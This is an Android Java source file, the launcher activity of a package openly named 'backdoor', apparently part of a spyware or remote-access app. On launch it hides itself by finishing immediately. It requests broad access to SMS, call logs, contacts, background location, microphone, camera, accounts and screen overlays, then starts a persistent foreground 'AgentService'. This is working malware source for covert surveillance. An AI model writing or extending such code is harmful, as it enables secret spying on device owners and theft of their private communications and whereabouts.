package com.lazyframework.backdoor;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "LazyFramework";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_PERMISSION_REQUEST = 101;
    private static final int NOTIFICATION_PERMISSION_REQUEST = 102;

    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isFinishing = false;

    private static final String[] REQUIRED_PERMISSIONS = {
            android.Manifest.permission.INTERNET,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.WRITE_CALL_LOG,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.GET_ACCOUNTS,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.SYSTEM_ALERT_WINDOW,
            android.Manifest.permission.WAKE_LOCK
    };

    private static final String[] PERMISSIONS_ANDROID_13 = {
            android.Manifest.permission.POST_NOTIFICATIONS,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.READ_MEDIA_VIDEO,
            android.Manifest.permission.READ_MEDIA_AUDIO
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "🚀 MainActivity created");

        // ✅ CALL FINISH IMMEDIATELY - FIX FOR THE CRASH
        // Call finish before any other operations
        finish();
        isFinishing = true;
        Log.d(TAG, "👻 Activity finished immediately");

        // Start the process (this will run even after finish is called)
        startAutoStartProcess();
    }

    // ✅ ADD onResume() with finish call to ensure it's handled
    @Override
    protected void onResume() {
        super.onResume();
        // If somehow activity is resumed without finishing, finish immediately
        if (!isFinishing) {
            finish();
            isFinishing = true;
            Log.d(TAG, "👻 Activity finished in onResume");
        }
    }

    private void startAutoStartProcess() {
        Log.d(TAG, "🔄 Auto start process initiated");

        // Request all permissions
        checkAndRequestPermissions();

        // Overlay permission (Android 6+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestOverlayPermission();
        }

        // Notification permission (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestNotificationPermission();
        }

        // Start service
        startAgentService();
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            for (String permission : PERMISSIONS_ANDROID_13) {
                if (ContextCompat.checkSelfPermission(this, permission)
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            Log.d(TAG, "📋 Requesting " + permissionsNeeded.size() + " permissions");
            ActivityCompat.requestPermissions(
                    this,
                    permissionsNeeded.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE
            );
        } else {
            Log.d(TAG, "✅ All permissions already granted");
        }
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Log.d(TAG, "🔄 Requesting overlay permission");
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())
                );
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
            }
        }
    }

    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this,
                    android.Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "🔄 Requesting notification permission");
                ActivityCompat.requestPermissions(
                        this,
                        new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                        NOTIFICATION_PERMISSION_REQUEST
                );
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Hanya log, tidak perlu action
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Hanya log
    }

    private void startAgentService() {
        try {
            Log.d(TAG, "🚀 Starting AgentService...");
            Intent serviceIntent = new Intent(this, AgentService.class);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "✅ Service started");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting service: " + e.getMessage());
        }
    }

    @Override
    public void onBackPressed() {
        // Disable back button - already finished
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isFinishing = true;
        Log.d(TAG, "💀 MainActivity destroyed");
    }
}